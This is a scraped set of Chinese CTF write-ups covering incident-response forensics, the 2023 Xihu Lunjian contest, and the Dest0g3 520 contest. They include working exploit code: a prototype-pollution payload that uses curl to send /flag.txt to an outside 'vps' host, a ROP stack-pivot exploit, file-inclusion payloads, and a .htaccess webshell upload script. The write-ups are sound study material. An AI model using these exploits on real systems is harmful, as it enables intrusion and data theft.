<p>DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</p>
<h1 id="ir">IR</h1>
<h2 id="incidentresponse_1">IncidentResponse_1</h2>
<p>将镜像导入虚拟机，然后直接用volatility.exe分析vmdx即可</p>
<p>分析请求地址找到进程即可找到挖矿程序路径</p>
<p>得到挖矿程序所在路径 /etc/redis/redis-server</p>
<p>所以flag为6f72038a870f05cbf923633066e48881</p>
<h2 id="incidentresponse_2">IncidentResponse_2</h2>
<p>同上，得到挖矿程序连接的矿池域名是 domain：<a href="http://donate.v2.xmrig.com">donate.v2.xmrig.com</a></p>
<p>所以flag为3fca20bb92d0ed67714e68704a0a4503</p>
<h2 id="incidentresponse_3">IncidentResponse_3</h2>
<p>登录虚拟机恢复之后查看WEB服务相关日志/home/app，分析发现存在JAVA服务，同时存在组件的shiro漏洞，全称为shirodeserialization</p>
<p>所以flag为3ee726cb32f87a15d22fe55fa04c4dcd</p>
<h2 id="incidentresponse_4">IncidentResponse_4</h2>
<p>同上vol分析得到攻击者IP地址为81.70.166.3</p>
<p>所以flag为b2c5af8ce08753894540331e5a947d35</p>
<h2 id="incidentresponse_5">IncidentResponse_5</h2>
<p>利用vol工具读取日志可以找到UA头，得到flag</p>
<p>6ba8458f11f4044cce7a621c085bb3c6</p>
<h2 id="incidentresponse_6">IncidentResponse_6</h2>
<p>也是利用vol工具一把梭，得到ssh密钥路径/root/.ssh/authorized_keys</p>
<p>所以flag为a1fa1b5aeb1f97340032971c342c4258</p>
<h2 id="incidentresponse_7">IncidentResponse_7</h2>
<p>查看自启动配置，得到一个假的redis配置，也就是入侵者创建的服务，路径为</p>
<p>/lib/systemd/system/redis.service</p>
<p>得到flag b2c5af8ce08753894540331ea947d35</p>
<h1 id="ew">EW</h1>
<h2 id="ez_web1">Ez_web1</h2>
<p>发现直接写入了d00r.php利用的文件是ViewMore.php。</p>
<img src="https://img.hzy2003628.top/image-20230827141414379.png" alt="image-20230827141414379" style="zoom:200%;">
<p>Flag为：ViewMore.php</p>
<h2 id="ez_web2">Ez_web2</h2>
<p>追踪d00r.php的http流量，发现内网ip。</p>
<img src="https://img.hzy2003628.top/image-20230827141429663.png" alt="image-20230827141429663" style="zoom:200%;">
<p>Flag为：192.168.101.132</p>
<h2 id="ez_web3">Ez_web3</h2>
<p>将base64数据解码成压缩包，发现需要密码。</p>
<img src="https://img.hzy2003628.top/image-20230827141508530.png" alt="image-20230827141508530" style="zoom:200%;">
<p>在流量中发现了passwd。</p>
<img src="https://img.hzy2003628.top/image-20230827141527811.png" alt="image-20230827141527811" style="zoom:200%;">
<p>得到flag为：7d9ddff2-2d67-4eba-9e48-b91c26c42337</p>
<h1 id="hd">HD</h1>
<h2 id="hd1">HD1</h2>
<p>发现回显是admin，所以对应的前边一个流量为admin账号密码登录。</p>
<img src="https://img.hzy2003628.top/image-20230827141549057.png" alt="image-20230827141549057" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230827141603318.png" alt="image-20230827141603318" style="zoom:200%;">
<p>之后Aes解密得到flag为：flag{WelC0m5_TO_H3re}</p>
<h2 id="hd2">HD2</h2>
<p>直接追踪tcp找到了key。</p>
<img src="https://img.hzy2003628.top/image-20230827141618133.png" alt="image-20230827141618133" style="zoom:200%;">
<p>Flag为：ssti_flask_hsfvaldb</p>
<h2 id="hd3">HD3</h2>
<img src="https://img.hzy2003628.top/image-20230827141633061.png" alt="image-20230827141633061" style="zoom:200%;">
<p>Flag为：red</p>
<h2 id="hd4">HD4</h2>
<img src="https://img.hzy2003628.top/image-20230827141648219.png" alt="image-20230827141648219" style="zoom:200%;">
<p>Flag值为：index</p>
<h1 id="web">WEB</h1>
<p>发现测试的日志：</p>
<img src="https://img.hzy2003628.top/image-20230827141704323.png" alt="image-20230827141704323" style="zoom:200%;">
<p>尝试后，首先发现了phpinfo泄露</p>
<img src="https://img.hzy2003628.top/image-20230827141719889.png" alt="image-20230827141719889" style="zoom:200%;">
<p>在ConfigPanel.php中发现了phpinfo()，直接把回显注释掉。</p>
<img src="https://img.hzy2003628.top/image-20230827141733030.png" alt="image-20230827141733030" style="zoom:200%;">
<p>这样就解决了phpinfo泄露。</p>
<p>Gii存在文件读取漏洞，再将gii给功能中的文件读取函数注释掉。</p>
<img src="https://img.hzy2003628.top/image-20230827141747287.png" alt="image-20230827141747287" style="zoom:200%;">
<p>然后覆盖，即可得到flag</p>
<img src="https://img.hzy2003628.top/image-20230827141804295.png" alt="image-20230827141804295" style="zoom:200%;">
<h1 id="bf">BF</h1>
<h2 id="baby_forensics_1">baby_forensics_1</h2>
<p>从内存镜像提取出bitlocker，解密镜像，然后得到key.txt</p>
<img src="https://img.hzy2003628.top/image-20230827141817619.png" alt="image-20230827141817619" style="zoom:200%;">
<p>Key进行了rot47加密，在线解密得到flag</p>
<img src="https://img.hzy2003628.top/image-20230827141828490.png" alt="image-20230827141828490" style="zoom:200%;">
<p>2e80307085fd2b5c49c968c323ee25d5</p>
<h2 id="baby_forensics_2">baby_forensics_2</h2>
<p>从RAW载入图像截取计算器当前结果得到</p>
<img src="https://img.hzy2003628.top/image-20230827141840546.png" alt="image-20230827141840546" style="zoom:200%;">
<p>7598632541</p>
<h1 id="tp">TP</h1>
<h2 id="tcpdump_3">Tcpdump_3</h2>
<p>在43504组里发现了jdbc漏洞</p>
<img src="https://img.hzy2003628.top/image-20230827141851840.png" alt="image-20230827141851840" style="zoom:200%;">
<p>用户名为zyplayer，密码为1234567</p>
<p>Flag：flag{zyplayer:1234567}</p>
<h2 id="tcpdump_4">Tcpdump_4</h2>
<p>在43551组里找到了一个本地的漏洞测试，上传了一个custom.dtd.xml</p>
<img src="https://img.hzy2003628.top/image-20230827142002354.png" alt="image-20230827142002354" style="zoom:200%;">
<p>经过搜索后发现，此漏洞是PostgreSQL JDBC Driver RCE，其编号为CVE-2022-21724</p>
<p>Flag：flag{ CVE-2022-21724:custom.dtd.xml}</p>
<h2 id="tcpdump_5">Tcpdump_5</h2>
<p>过滤tcp流，在43661组里面发现了fscan</p>
<img src="https://img.hzy2003628.top/image-20230827142016286.png" alt="image-20230827142016286" style="zoom:200%;">
<p>Flag：flag{fscan}</p>
<h1 id="hw">HW</h1>
<h2 id="hw1">HW1</h2>
<p>分析流量发现，成功的包只有80,888,8888</p>
<p>所以flag为：80,888,8888</p>
<h2 id="hw2">HW2</h2>
<p>发现响应200</p>
<img src="https://img.hzy2003628.top/image-20230827142032341.png" alt="image-20230827142032341" style="zoom:200%;">
<p>发现flag位置，和加密方式。</p>
<img src="https://img.hzy2003628.top/image-20230827142047576.png" alt="image-20230827142047576" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230827142101518.png" alt="image-20230827142101518" style="zoom:200%;">
<p>AES解密得到flag</p>
<img src="https://img.hzy2003628.top/image-20230827142112568.png" alt="image-20230827142112568" style="zoom:200%;">
<h2 id="hw3">HW3</h2>
<p>对748007e861908c03进行md5解密</p>
<p>得到flag：14mk3y</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年西湖论剑</title>
    <url>/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302031230945.png?x-oss-process=hzy" alt="image-20230203123031680"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302031236697.png?x-oss-process=hzy" alt="image-20230203123650665" style="zoom:200%;">
<h1 id="wp">WP</h1>
<h2 id="web">WEB</h2>
<h4 id="扭转乾坤">扭转乾坤</h4>
<p>大写一个F即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223205.gif?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>DASCTF{407a13a21a6b85b1236b003479468c82}</p>
<h4 id="unusual-php">unusual php</h4>
<p>phpinfo发现test的拓展</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223217.gif?x-oss-process=hzy" alt="img"></p>
<p>读php.ini</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223220.gif?x-oss-process=hzy" alt="img"></p>
<p>读取so文件</p>
<p><a href="http://url/?a=read&amp;file=php://filter/convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so">http://url/?a=read&amp;file=php://filter/convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so</a></p>
<p>反编译看一下存在对文件进行rc4解密操作</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223221.gif?x-oss-process=hzy" alt="img"></p>
<p>那就对一句话rc4加密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223223.gif?x-oss-process=hzy" alt="img"></p>
<p>base64解码后保存为exp.php，上传发现需要提权</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223263.gif?x-oss-process=hzy" alt="img"></p>
<p>尝试使用sudo发现tty问题，使用python加载一个pty</p>
<p>python3 -c ‘import pty;pty.spawn(“/bin/sh”)’</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223712.gif?x-oss-process=hzy" alt="img"></p>
<p>sudo进行cat，发现需要密码，在etc目录发现sudoers.bak备份文件，发现www用户chmod不需要密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223723.gif?x-oss-process=hzy" alt="img"></p>
<p>直接上权限，读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223731.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{20663467266566204775890084453113}</p>
<h4 id="node-magical-login">Node Magical Login</h4>
<p>简单的js代码审计。Flag分成了两部分。</p>
<p>第一部分：</p>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223732.gif?x-oss-process=hzy" alt="img" style="zoom:200%;">
<p>这里就简单的判断了一下user是否等于admin，直接绕过。</p>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223741.gif?x-oss-process=hzy" alt="img" style="zoom:200%;">
<p>第二部分：</p>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223750.gif?x-oss-process=hzy" alt="img" style="zoom:200%;">
<p>checkcode !== “aGr5AtSp55dRacer”，让其为真，利用数组绕过。</p>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223188.gif?x-oss-process=hzy" alt="img" style="zoom:200%;">
<p>Flag为：DASCTF{23565735532540557696203746863296}</p>
<h4 id="real_ez_node">real_ez_node</h4>
<p>找到类似的题目。</p>
<p><a href="https://blog.csdn.net/stepone4ward/article/details/123906926">几道nodejs题目的分析_GAPPPPP的博客-CSDN博客_nodejs ssrf</a></p>
<p>里边Node Game这一道也是ssrf。</p>
<p>修改一下里边的代码，利用ssrf打原型链污染。</p>
<p>Exp：</p>
<pre><code class="hljs plaintext">import requests

import urllib.parse

 

def encode(a):

  tmp = u&quot;&quot;

  for i in a:

​    tmp += chr(0x0100+ord(i))

  return tmp

 

payload = &#x27;&#x27;&#x27; HTTP/1.1

 

POST /copy HTTP/1.1

Host: 127.0.0.1

Pragma: no-cache

Cache-Control: no-cache

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Content-Type: application/json

Connection: close

Content-Length: 170

 

&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl http://vps:port -F xx=@/flag.txt&#x27;);var __tmp2&quot;&#125;

GET / HTTP/1.1

test:&#x27;&#x27;&#x27;.replace(&quot;\n&quot;,&quot;\r\n&quot;)

payload = encode(payload)

re = requests.get(&#x27;http://3000.endpoint-9a3d98e7aaf647ae8c64b7007bfc464b.m.ins.cloud.dasctf.com:81/curl?q=&#x27; + urllib.parse.quote(payload))

print(re.text)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223420.gif?x-oss-process=hzy" alt="img"></p>
<p>Flag为：DASCTF{10034776926713905225407173576398}</p>
<h2 id="pwn">PWN</h2>
<h4 id="message-board">Message Board</h4>
<p>有沙盒保护，那就用orw读flag打印出来</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223434.gif?x-oss-process=hzy" alt="img"><br>
一个是格式化字符串漏洞，一个是栈溢出，只能溢出两个地址，那就用栈迁移</p>
<p>调试得出%31$p可以把libc—start—main+243泄露出来，</p>
<p>从而得出libc——base</p>
<p>然后写orw，再栈迁移去执行，得到flag</p>
<pre><code class="hljs plaintext">from pwn import *

context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)

p=remote(&quot;tcp.cloud.dasctf.com&quot;,29040)

\#p=process(&quot;./pwn&quot;)

libc=ELF(&quot;./libc.so.6&quot;)

elf=ELF(&quot;./pwn&quot;)

 

leave_ret=0x00000000004012e1

bss=0x404080

pop_rdi=0x0000000000401413

main = 0x401378

 

p.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:\n&quot;)

\#gdb.attach(p)

\#pause()

p.sendline(str(&quot;%31$p&quot;))

p.recvuntil(&quot;Hello, &quot;)

addr=int(p.recvuntil(b&quot;\n&quot;)[:-1],16)-243

print(hex(addr))

libc_base=addr-libc.sym[&quot;__libc_start_main&quot;]

print(hex(libc_base))

 

read_addr=libc_base+libc.sym[&quot;read&quot;]

write_addr=libc_base+libc.sym[&quot;write&quot;]

open_addr=libc_base+libc.sym[&quot;open&quot;]

pop_rsi=libc_base+0x000000000002601f

pop_rdx=libc_base+0x0000000000142c92

 

 

p.recvuntil(&quot;Now, please say something to DASCTF:\n&quot;)

payload=b&#x27;a&#x27;*0xb0+p64(bss+0x200)+p64(main)

\#gdb.attach(p)

\#pause()

p.send(payload)

 

payload = b&quot;/flag\x00\x00\x00&quot; # 0x4041d0

payload += p64(pop_rdi)

payload += p64(0x4041d0)

payload += p64(pop_rsi)

payload += p64(0)

payload += p64(open_addr)

payload += p64(pop_rdi)

payload += p64(3)

payload += p64(pop_rsi)

payload += p64(0x404700)

payload += p64(pop_rdx)

payload += p64(0x100)

payload += p64(read_addr)

payload += p64(pop_rdi)

payload += p64(1)

payload += p64(pop_rsi)

payload += p64(0x404700)

payload += p64(pop_rdx)

payload += p64(0x100)

payload += p64(write_addr)

payload = payload.ljust(0xb0, b&quot;a&quot;)

payload += p64(0x4041d0)

payload += p64(leave_ret)

 

p.send(payload)

 

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223463.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{20107889289710880412926736681857}</p>
<h2 id="misc">MISC</h2>
<h4 id="签到题喵">签到题喵</h4>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223478.gif?x-oss-process=hzy" alt="img"></p>
<p>关注公众号发送西湖论剑2023我来了！得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223486.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{W3lc0m3_t0_GCSIS_2023}</p>
<h4 id="take_the_zip_easy">take_the_zip_easy</h4>
<p>压缩包加密</p>
<p>可以看到压缩包里面的压缩包和流量一个名，猜测里面也是流量</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223628.gif?x-oss-process=hzy" alt="img"></p>
<p>使用bkcrack工具直接爆</p>
<p>工具地址<a href="https://github.com/kimci86/bkcrack/releases">Releases · kimci86/bkcrack (github.com)</a></p>
<p>.\bkcrack.exe -C .\zipeasy.zip -c dasflow.zip -p .\1.txt -o 30</p>
<p>得到key 2b7d78f3 0ebcabad a069728c</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223802.gif?x-oss-process=hzy" alt="img"></p>
<p>恢复完整密码：123#@!qazWSX</p>
<p>.\bkcrack.exe -C .\zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -r 15 ?p</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223881.gif?x-oss-process=hzy" alt="img"></p>
<p>解压分析流量</p>
<p>哥斯拉流量特征</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223896.gif?x-oss-process=hzy" alt="img"></p>
<p>往前翻几个流量，找到$key=‘d8ea7326e6ec5916’;</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223894.gif?x-oss-process=hzy" alt="img"></p>
<p>发现flag.zip</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223940.gif?x-oss-process=hzy" alt="img"></p>
<p>找到一个类似题目的文章</p>
<p><a href="https://blog.csdn.net/u011250160/article/details/120523994">(85条消息) 首届“陇剑杯”网络安全大赛题目wifi详解_u011250160的博客-CSDN博客</a></p>
<p>直接用里面的脚本跑出来明文</p>
<pre><code class="hljs plaintext">&lt;?php

function encode($D,$K)&#123;

  for($i=0;$i&lt;strlen($D);$i++)&#123;

​    $c = $K[$i+1&amp;15];

​    $D[$i] = $D[$i]^$c;

  &#125;

  return $D;

&#125;

 

$pass=&#x27;air123&#x27;;

$payloadName=&#x27;payload&#x27;;

$key=&#x27;d8ea7326e6ec5916&#x27;;

// 原来的数据去掉前十六位和后十六位然后解密

echo gzdecode(encode(base64_decode(&#x27;J+5pNzMyNmU2Zkj4dYADUu5NThjkf39Jf7E3ff4hHq4XSElxItE0ZQOqa0EPMTZk&#x27;),$key));

?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223010.gif?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223145.gif?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223259.gif?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223357.gif?x-oss-process=hzy" alt="img"></p>
<p>得到关键命令</p>
<p>cmdLinePsh -c “cd “/var/www/html/upload/”;zip -o flag.zip /flag -P airDAS1231qaSW@” 2&gt;&amp;1methodNameexecCommand</p>
<p>得到压缩包密码为airDAS1231qaSW@</p>
<p>解压得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223372.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{7892a81d23580e4f3073494db431afc5}</p>
<h4 id="mp3">mp3</h4>
<p>MP3音频隐写，使用MP3stego解密得到一串密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223421.gif?x-oss-process=hzy" alt="img"></p>
<p>音频使用formost可以分离出来一个图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223485.gif?x-oss-process=hzy" alt="img"></p>
<p>然后对该图片进行zsteg隐写解密可以检测分离出来一个压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223642.gif?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223652.gif?x-oss-process=hzy" alt="img"></p>
<p>解压密码就是上面的</p>
<p>8750d5109208213f</p>
<p>得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223963.gif?x-oss-process=hzy" alt="img"></p>
<p>文件名是47，是rot47解密</p>
<p>在线解密得到</p>
<p>这是js，直接放控制台跑出来flag</p>
<p>a=~[];a={<strong><em>:++a,aaaa:(![]+“”)[a],<em><em>a:++a,a_a</em>:(![]+“”)[a],<em>a</em>:++a,a_aa:({}+“”)[a],aa_a:(a[a]+“”)[a],<em>aa:++a,aaa</em>:(!“”+“”)[a],a</em></em>:++a,a_a:++a,aa</strong>:({}+“”)[a],aa_:++a,aaa:++a,a___:++a,a__a:++a};a.a_=(a.a_=a+“”)[a.a_a]+(a.<em>a=a.a</em>[a.<em><em>a])+(a.aa=(a.a+“”)[a.<strong>a])+((!a)+“”)[a._aa]+(a.</strong>=a.a</em>[a.aa</em>])+(a.a=(!“”+“”)[a.<strong>a])+(a.<em>=(!“”+“”)[a.<em>a</em>])+a.a</em>[a.a_a]+a.</strong>+a.<em>a+a.a;a.aa=a.a+(!“”+“”)[a.<em>aa]+a.__+a.</em>+a.a+a.aa;a.a=(a.</em><em><em>)[a.a</em>][a.a</em>];a.a(a.a(a.aa+“”“+a.a_a_+(![]+”“)[a.<em>a</em>]+a.aaa_+”\“+a.<em><em>a+a.aa</em>+a.<em>a</em>+a.</em><em>+“(\”\&quot;+a.<strong>a+a.</strong></em>+a.a__+”\“+a.<strong>a+a.</strong><em>+a.<strong>a+“\”+a.<em><em>a+a.<em>a</em>+a.<em>aa+“\”+a.<strong>a+a.</strong></em>+a.<em>aa+“\”+a.<strong>a+a.<em>a</em>+a.a</strong>+“\”+a.<strong>a+a.</strong></em>+a.aa</em>+“{”+a.aaaa+a.a</em></strong>+a.</em><em><em>+a.a__a+a.aaa+a.<em>a</em>+a.a_a+a.aaa+a.aa_a+a.aa</em>+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a</em>+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.<strong>a+a.a_a+a.aa</strong>+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+”}\“\”+a.a__+a.___+“);”+“”&quot;)())();</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223013.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p>
<h2 id="crypto">CRYPTO</h2>
<h4 id="myerrorlearn">MyErrorLearn</h4>
<p>分析源码逻辑，三次数据交互，分别是mod,r1,r2,d1,d2,最终需要解密出secret</p>
<p>由d1 = invert(secret + r1, p)得<br>
d1=(secret+r1)<strong>-1-p<br>
变换得(secret+r1)</strong>-1=d1+p<br>
化简得secret=(1-d1<em>r1-p</em>r1)(d1+p)**-1</p>
<p>由p为未知数故设p1为a，p2为b</p>
<p>代回去消去未知数secret，变形为一端=0</p>
<p>(1 - r1 * a - r1 * d1) * (d2 + b)-(1 - r2 * b - r2 * d2) * (d1 + a) = 0</p>
<p>定义f为求解的函数，a，b是生成的二元多项式整数环</p>
<p>即f = (1 - r1 * a - r1 * d1) * (d2 + b)-(1 - r2 * b - r2 * d2) * (d1 + a)</p>
<p>利用多元模多项式求解小值解，利用coppersmith求解a,.b</p>
<p>【coppersmith代码借鉴https://zhuanlan.zhihu.com/p/561322960】</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import itertools
def small_roots(f, bounds, m=1, d=None):
    d = f.degree()
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
 
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
 
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
 
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
 
    B = B.dense_matrix().LLL()
 
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
 
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
 
    return []
 
mod = 92100081961922123317354364142973232257272371216119985095295208975594012322694336837687903587489702164051771885305360479800056587123002931410178102082687907359991556301050157342199356458401722027715097873416983026040036496765934235032324550748150997337318826388553502634550248086829079176920898088118038867551
 
r1 = 8214590193925238830505127604775413782332733392815062381248757476059854117758683270097252412866307611637367034142922256065905470403923560144204645716546449
d1 = 89750710412409099564854488895838804911632857521414963283460533705489238233639042729131713101249001764032359271488136597969717865865908207494966703360976015727598402072831611939183300529475809872044133505192962069023343886502414066845507585364807172441652853899627975472528604849314557790383810544591414215338
 
r2 = 12530692180542335757367199237138051814559195301829114851062867901112554199516531210622434281574085869105541901024468525551800387587824433268881913394543751
d2 = 56984826749503729138938771754062570762741357041693033530193868051455677494732316842071771667696238229676952474890782597755591220510875881362589098271458797942431119444889619225670045434514547419532506635422638811227606061406310777543460067584360606610382347668548374124824000810533259395933988679507314881086
 
 
 
PR.&lt;a,b&gt;= PolynomialRing(Zmod(mod))
 
f1 = (1 - r1 * a - r1 * d1) * (d2 + b)
f2 = (1 - r2 * b - r2 * d2) * (d1 + a)
f = f1 - f2
 
bounds=(2**246, 2**246)
root= small_roots(f, bounds)
#print(root)
 
res= root[0][0]
answer=   - r1 +  inverse_mod(int(d1 + res), int(mod))
print(answer)
得到secret     =58035638763211779635385694691281079480117214515681262829931581576067273044379807718928297777673686996338877456978343922762720727731134991027418112191072637470541308432268351606475176969118729960499904608456012293549859406863184474766031030156678534133549912415744404819235823252201334512088834796944477723471
输入远程验证，得到flag</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302041223021.gif?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{79052339950974957833193602615575}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <url>/2022/05/27/520/</url>
    <content><![CDATA[<p><strong>Dest0g3 520迎新赛</strong>记录一下自己的解题过程吧，太菜了太菜了！</p>
<span id="more"></span>
<h1 id="web">web</h1>
<h2 id="phpdest">phpdest</h2>
<p>题目</p>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
require_once &#x27;flag.php&#x27;;
if(isset($_GET[&#x27;file&#x27;])) &#123;
    require_once($_GET[&#x27;file&#x27;]);
&#125;</code></pre>
<blockquote>
<p><code>/proc/self/cwd/</code>指向当前进程运行目录的一个符号链接</p>
</blockquote>
<pre><code class="hljs plaintext">?file=php://filter/read=convert.base64-encode/index/resource=/123/../../proc/self/cwd/flag.php</code></pre>
<p><img src="https://z4a.net/images/2022/05/22/image48ab0522bb7f6441.png" alt></p>
<p>解码得到flag</p>
<p>Dest0g3{e2d37eeb-bd8b-48d9-8444-75936cc51cb6}</p>
<h2 id="easyphp">EasyPHP</h2>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
include &quot;fl4g.php&quot;;
$dest0g3 = $_POST[&#x27;ctf&#x27;];
$time = date(&quot;H&quot;);
$timme = date(&quot;d&quot;);
$timmme = date(&quot;i&quot;);
if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;
    echo $fl4g;
&#125;else&#123;
    echo &quot;Try harder!&quot;;
&#125;
set_error_handler(
    function() use(&amp;$fl4g) &#123;
        print $fl4g;
    &#125;
);
$fl4g .= $dest0g3;
?&gt;</code></pre>
<p>只要处理函数异常就会触发输出flag，所以可以传入数组</p>
<pre><code class="hljs plaintext">ctf[]=huang</code></pre>
<p><img src="https://z4a.net/images/2022/05/31/image8f52bf217c9928d3.png" alt="image8f52bf217c9928d3.png"></p>
<pre><code class="hljs plaintext">Dest0g3&#123;1fae3f37-c53f-47a8-81c9-545c2a6095ff&#125;</code></pre>
<h2 id="funny_upload">funny_upload</h2>
<p><img src="https://z4a.net/images/2022/05/22/imagec038902ca58357cd.png" alt="imagec038902ca58357cd.png"></p>
<p>上传.htaccess文件和图片马从而webshell</p>
<p>.haccess文件的内容是</p>
<pre><code class="hljs plaintext">AddType application/x-httpd-php .gif
php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=images.gif</code></pre>
<p>images.gif文件内容是</p>
<pre><code class="hljs plaintext">GIF98a12PD9waHAgZXZhbCgkX1BPU1RbJ3dob2FtaSddKTs/Pg==</code></pre>
<p>这里使用base64编码的一句话，因为题目过滤了&lt;等字符，使用脚本一键上传</p>
<pre><code class="hljs plaintext">import requests
url = &quot;http://7214a0bf-3e8b-4f76-b380-b539d59198c2.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;
shell = &#123;&quot;file&quot;:(&#x27;images.gif&#x27;,open(&#x27;images.gif&#x27;,&#x27;rb&#x27;),&#x27;image/gif&#x27;)&#125;
r = requests.post(url=url,files=shell)
print(r.text)
